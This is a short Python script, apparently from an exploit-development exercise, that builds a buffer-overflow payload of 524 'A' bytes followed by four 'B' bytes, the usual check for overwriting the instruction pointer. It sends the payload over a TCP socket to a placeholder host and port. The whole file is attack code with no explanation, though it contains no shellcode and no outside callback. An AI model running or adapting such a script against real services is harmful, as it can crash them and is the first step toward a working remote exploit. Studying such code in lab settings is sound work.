import sys , socket 

buffer = "A" * 524 + "B" * 4

payload= buffer + '\r\n'
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('x.x.x.x',xxxx))
s.send((payload.encode()))
s.close()

sys.exit()